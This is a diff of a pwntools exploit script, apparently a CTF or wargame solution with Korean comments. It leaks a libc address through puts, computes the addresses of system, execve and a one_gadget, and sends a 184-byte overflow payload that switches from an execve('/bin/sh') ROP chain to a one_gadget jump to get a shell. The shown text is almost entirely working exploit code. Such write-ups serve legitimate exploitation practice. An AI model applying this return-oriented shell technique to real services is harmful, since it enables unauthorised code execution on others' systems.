@@ -37,22 +37,26 @@ p.recvline()
 rcv = p.recv()
 rcv = rcv+"\x00"*(8-len(rcv))
 rcv = u64(rcv)
+
 #log.info("addr : "+rcv)
 
-libc = rcv-puts_offset
+libc = rcv - puts_offset
+
 system = libc+system_offset
 bin = libc+bin_offset 
+
 execve = libc + execve_offset
-one = libc + one_gadget[1]
+one = libc+one_gadget[2]
 
 log.info("addr : "+hex(rcv))
+pause()
 
 payload2 = "c"*184
-payload2 += p64(p_di_si_dx) + p64(bin) + p64(0) + p64(0) + p64(execve)
+#payload2 += p64(p_di_si_dx) + p64(bin) + p64(0) + p64(0) + p64(execve)
 #execve("/bin/sh",0,0) , rax = 0x3b
 #system 함수를 통한 실행이 되지 않아 execve의 주소를 직접 가지고 왔다. 
 
-#payload2 += p64(one)
+payload2 += p64(one)
 #매직가젯을 이용한 풀이. 실행 후 한줄씩 가다보면 execve 호출 구간으로 이동함.  
 
 
